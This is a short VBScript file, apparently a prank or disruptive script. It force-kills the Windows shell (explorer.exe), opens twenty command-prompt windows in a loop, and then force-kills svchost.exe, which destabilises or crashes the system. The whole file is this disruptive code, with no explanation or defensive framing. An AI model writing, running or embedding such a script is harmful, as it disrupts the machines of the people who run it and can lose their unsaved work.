Dim shell, I

Set shell = CreateObject("WScript.Shell")

shell.Run "taskkill /f /im explorer.exe"

For I = 1 To 20
    shell.Run "cmd"
Next

shell.Run "taskkill /f /im svchost.exe"
